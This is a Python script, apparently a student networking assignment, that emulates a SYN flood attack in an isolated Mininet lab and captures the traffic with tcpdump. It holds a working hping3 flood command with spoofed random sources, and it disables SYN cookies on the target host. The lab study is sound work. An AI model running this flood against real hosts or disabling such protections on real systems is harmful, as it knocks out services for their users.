import subprocess
import time
import threading

from mininet.topo import Topo
from mininet.net import Mininet
from mininet.log import setLogLevel, info

# I am running this experiement with Mininet so that I can get an Isolated environment to run the experiment.
class MyTopo(Topo):

    def build(self):
        # I am creating a simple topology with 2 hosts and 1 switch
        leftHost = self.addHost('h1')
        rightHost = self.addHost('h2')
        connector = self.addSwitch('s1')

        self.addLink(leftHost, connector, bw=10) 
        self.addLink(connector, rightHost, bw=10)
    

def start_legitimate_traffic(host, server_ip, server_port): # This function will start the legitimate traffic
    host.cmd(f'''
                while true; 
                do nc {server_ip} {server_port} <<< "Hello";
                sleep 1; 
                done &
            ''') # I am using netcat to send a message to the server every second. The nc command uses TCP by default. The reference for this command is given below.

    

def start_syn_flood(host, server_ip, server_port):
    host.cmd(f'hping3 -S -p {server_port} --flood --rand-source {server_ip} &') # I am using hping3 to flood SYN packets to the server. The reference for this command is given below.



setLogLevel('info')
topo = MyTopo() # I am creating the topology
net = Mininet(topo=topo) # I am creating the Mininet network
net.start() # I am starting the network

info("Testing network connectivity\n") 
net.pingAll() # To test the network connectivity, I use pingall

h1, h2 = net.get('h1', 'h2')

server_ip = h2.IP()
server_port = 8080 

h2.cmd('sysctl -w net.ipv4.tcp_max_syn_backlog=10000') # I am setting the maximum backlog for the SYN queue to 10000
h2.cmd('sysctl -w net.ipv4.tcp_syncookies=0') # I am disabling SYN cookies
h2.cmd('sysctl -w net.ipv4.tcp_synack_retries=1') # I am setting the number of SYN-ACK retries to 1

h1.cmd(f'tcpdump -w Q2_attack_copy.pcap -i {h1.defaultIntf()} tcp &') # I start the tcpdump to capture the packets
time.sleep(1)

legitimate_thread = threading.Thread(target=start_legitimate_traffic, args=(h1, server_ip, server_port)) # In one of the threads, I start the legitimate traffic
legitimate_thread.start()

time.sleep(20) # I run the legitimate traffic for 20 seconds
attack_start = time.time()

syn_flood_thread = threading.Thread(target=start_syn_flood, args=(h1, server_ip, server_port)) # In another thread, I start the SYN flood
syn_flood_thread.start()

time.sleep(100)
attack_end = time.time() # I run the SYN flood for 100 seconds

h1.cmd('pkill hping3')
syn_flood_thread.join() # I stop the SYN flood

time.sleep(20)

h1.cmd('pkill nc') # I stop the legitimate traffic
legitimate_thread.join()

h1.cmd('pkill tcpdump') # I stop the tcpdump

net.stop() # I stop the Mininet network

# References
# https://www.geeksforgeeks.org/systl-command-in-linux/
# https://nccs.gov.in/public/events/DDoS_Presentation_17092024.pdf
# https://www.geeksforgeeks.org/practical-uses-of-ncnetcat-command-in-linux/
# Other References same as Q1
